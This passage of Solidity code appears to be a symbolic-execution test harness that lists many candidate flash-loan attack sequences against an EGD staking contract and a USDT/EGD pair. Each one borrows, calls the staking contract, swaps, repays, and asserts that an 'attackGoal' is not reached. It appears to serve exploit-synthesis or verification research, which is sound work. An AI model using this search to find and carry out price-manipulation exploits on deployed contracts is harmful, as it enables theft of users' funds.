
    function check_cand188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
